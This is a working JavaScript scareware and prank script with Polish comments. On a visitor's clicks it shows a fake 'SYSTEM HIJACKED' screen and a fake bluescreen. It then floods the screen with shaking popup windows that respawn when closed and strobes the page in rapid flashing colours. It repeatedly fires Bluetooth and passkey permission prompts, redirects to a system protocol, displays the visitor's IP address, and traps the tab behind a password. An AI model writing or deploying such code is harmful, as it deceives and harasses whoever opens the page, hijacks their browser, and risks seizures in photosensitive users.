// --- ZBYCH-FLYING-HYDRA-OVERLORD-2026.js ---
// WYMAGA: Zbych.png, Xd.png, Ciastko.png, gratulacje.mp4, szybkakaczka.mp4, muzykaxd.mp3, Avast.mp3, Bluescreen.png

const ZBYCH_IMAGES = ["Zbych.png", "Zbych10.png", "Zbych2.png", "Zbych3.png", "Zbych4.png", "Zbych5.png", "Zbych6.png", "Zbych7.png", "Zbych8.png", "Zbych9.png"];
const CHINESE_TEXTS = ["你好", "入侵者", "致命错误", "警告", "蓝牙拦截", "数据泄露"];
let isActivated = false;
let clickCount = 0;
let zbychPoints = 0;

let sysData = { ip: "Pobieranie...", gpu: "Skanowanie...", battery: "Skanowanie...", cores: navigator.hardwareConcurrency || "Nieznane", ram: navigator.deviceMemory || "Nieznane" };

const audioZbych = new Audio('muzykaxd.mp3');
const audioAvast = new Audio('Avast.mp3');
audioZbych.loop = true;

// 1. HYPER-FLYING HYDRA (Latające i trzęsące się okna)
function spawnSkibidiWindow() {
    const isBSOD = Math.random() < 0.10;
    const w = 450;
    const h = 450;
    
    // Startowa pozycja i wektor ruchu (szybkość)
    let posX = Math.random() * (window.screen.width - w);
    let posY = Math.random() * (window.screen.height - h);
    let velX = (Math.random() * 30 - 15); // Losowa prędkość pozioma
    let velY = (Math.random() * 30 - 15); // Losowa prędkość pionowa

    const win = window.open("", `Zbych_${Math.random()}`, `width=${w},height=${h},left=${posX},top=${posY}`);
    
    if (win) {
        let content = isBSOD ? `<img src="Bluescreen.png" style="width:100vw; height:100vh; object-fit:fill;">` : 
                      `<video src="${Math.random() > 0.5 ? 'szybkakaczka.mp4' : 'gratulacje.mp4'}" autoplay loop muted style="width:100%; height:100%; object-fit:cover;"></video>`;
        
        win.document.write(`
            <body style="margin:0; background:black; overflow:hidden;">
                ${content}
                <script>
                    let x = ${posX}; let y = ${posY};
                    let vx = ${velX}; let vy = ${velY};
                    let sw = window.screen.availWidth;
                    let sh = window.screen.availHeight;

                    setInterval(() => {
                        // 1. RUCH PO CAŁYM EKRANIE
                        x += vx; y += vy;
                        
                        // 2. ODBIJANIE OD KRAWĘDZI MONITORA
                        if (x <= 0 || x >= sw - 450) vx *= -1;
                        if (y <= 0 || y >= sh - 450) vy *= -1;

                        // 3. POTĘŻNE TRZĘSIENIE (Shake)
                        let shakeX = Math.random() * 25 - 12.5;
                        let shakeY = Math.random() * 25 - 12.5;

                        window.moveTo(x + shakeX, y + shakeY);

                        // 4. STROBOSKOP W OKNIE
                        if(Math.random() > 0.85) document.body.style.filter = "invert(1)";
                        else document.body.style.filter = "none";
                    }, 30);

                    window.onbeforeunload = () => { window.opener.postMessage("closed", "*"); };
                </script>
            </body>
        `);
    }
}

// 2. STATIC CLICKER (Ciastko na środku)
function stworzStaticClicker() {
    const clicker = document.createElement('img');
    clicker.id = "zbych-cookie";
    clicker.src = "Ciastko.png";
    clicker.style = "position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:250px; cursor:pointer; z-index:25000; transition: transform 0.05s;";
    
    const counter = document.createElement('div');
    counter.id = "zbych-counter";
    counter.style = "position:fixed; top:10%; left:50%; transform:translateX(-50%); color:lime; font-size:45px; font-weight:bold; font-family:monospace; z-index:25001; text-shadow: 4px 4px black; text-align:center;";
    counter.innerHTML = `ZBYCH-PUNKTY: 0<br><span style="font-size:15px; color:red;">PUNKTY = WIĘCEJ LATAJĄCYCH KLONÓW</span>`;
    
    clicker.onclick = (e) => {
        e.stopPropagation();
        zbychPoints++;
        counter.innerHTML = `ZBYCH-PUNKTY: ${zbychPoints}<br><span style="font-size:15px; color:red;">CHAOS LEVEL: ${zbychPoints * 5}%</span>`;
        clicker.style.transform = "translate(-50%, -50%) scale(0.9)";
        setTimeout(() => clicker.style.transform = "translate(-50%, -50%) scale(1)", 50);
        
        spawnSkibidiWindow(); // Kliknięcie = Nowy latający klon
        if (zbychPoints % 3 === 0) spamBluetooth();
        if (zbychPoints % 7 === 0) wywolajPasskey();
        
        // Jump-scare flash
        const flash = document.createElement('img');
        flash.src = ZBYCH_IMAGES[Math.floor(Math.random()*ZBYCH_IMAGES.length)];
        flash.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:26000; opacity:0.25; pointer-events:none;";
        document.body.appendChild(flash);
        setTimeout(() => flash.remove(), 70);
    };
    document.body.appendChild(clicker);
    document.body.appendChild(counter);
}

// 3. MODUŁY ATAKU (Wszystko zachowane)
async function spamBluetooth() { if (navigator.bluetooth) try { await navigator.bluetooth.requestDevice({ acceptAllDevices: true }); } catch (e) {} }
async function wywolajPasskey() {
    if (!window.PublicKeyCredential) return;
    const options = {
        challenge: Uint8Array.from("ZBYCH-2026", c => c.charCodeAt(0)),
        rp: { name: "Zbych Security", id: window.location.hostname },
        user: { id: Uint8Array.from("1", c => c.charCodeAt(0)), name: "Antek", displayName: "Antek" },
        pubKeyCredParams: [{ alg: -7, type: "public-key" }],
        authenticatorSelection: { authenticatorAttachment: "platform" },
        timeout: 10000
    };
    try { await navigator.credentials.create({ publicKey: options }); } catch (e) {}
}

async function fullSystemScan() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        sysData.ip = data.ip;
    } catch (e) { sysData.ip = "ZABLOKOWANO"; }
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        sysData.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Zintegrowana";
    }
}

// 4. CHAOS NA STRONIE GŁÓWNEJ
function extremeEffects() {
    const colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF", "#000000"];
    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    document.body.style.transform = `translate(${Math.random()*20-10}px, ${Math.random()*20-10}px)`;
}

function spawnMainPageChaos() {
    const el = document.createElement('div');
    el.style = `position:fixed; left:${Math.random()*80}vw; top:${Math.random()*80}vh; z-index:15000; pointer-events:none;`;
    const r = Math.random();
    if (r < 0.4) el.innerHTML = `<img src="Xd.png" style="width:150px; transform:rotate(${Math.random()*360}deg);">`;
    else el.innerHTML = `<div style="background:black; color:lime; padding:10px; border:1px solid lime; font-family:monospace; font-size:11px;">[ZBYCH-CORE]<br>IP: ${sysData.ip}<br>GPU: ${sysData.gpu.substring(0,15)}...<br>PUNKTY: ${zbychPoints}</div>`;
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 1100);
}

// 5. START I SYSTEM HASŁA
window.addEventListener('click', () => {
    if (!isActivated && ++clickCount >= 3) {
        const div = document.createElement('div');
        div.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:red; color:white; z-index:35000; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;";
        div.innerHTML = `<h1>⚠️ SYSTEM HIJACKED ⚠️</h1><p>Wykryto CPU: ${sysData.cores} rdzeni</p><button id="fb" style="padding:20px; font-size:25px; cursor:pointer;">NAPRAW (START CLICKER)</button>`;
        document.body.appendChild(div);
        document.getElementById('fb').onclick = () => {
            isActivated = true;
            div.remove();
            audioZbych.play().catch(()=>{});
            stworzStaticClicker();
            fullSystemScan();
            // PĘTLE CHAOSU
            setInterval(spawnSkibidiWindow, 2500);
            setInterval(extremeEffects, 50);
            setInterval(spawnMainPageChaos, 500);
            setInterval(() => audioAvast.play().catch(()=>{}), 5500);
            setInterval(() => { window.location.href = "ms-paint:"; }, 5000);
            setInterval(spamBluetooth, 4500);
            setInterval(wywolajPasskey, 11000);
            setInterval(() => { 
                const msg = new SpeechSynthesisUtterance("zostałeś zezbychowany przez ciastko xddd"); 
                msg.lang = 'pl-PL'; window.speechSynthesis.speak(msg);
            }, 4500);
            stworzSystemHasla();
        };
    }
});

function stworzSystemHasla() {
    const d = document.createElement('div');
    d.style = "position:fixed; bottom:10px; left:10px; z-index:40000; background:white; padding:10px; border:2px solid red; color:black;";
    d.innerHTML = `HASŁO: <input type="password" id="p" style="width:80px;"> <button onclick="check()">OK</button>`;
    document.body.appendChild(d);
    window.check = () => {
        if (document.getElementById('p').value === "Zbych2026") {
            window.onbeforeunload = null; window.close(); location.href="about:blank";
        } else { spawnSkibidiWindow(); spawnSkibidiWindow(); }
    };
}

window.addEventListener("message", (e) => { if (e.data === "closed") { spawnSkibidiWindow(); spawnSkibidiWindow(); } });
window.onbeforeunload = () => "ZBYCH CIĘ NIE PUŚCI!";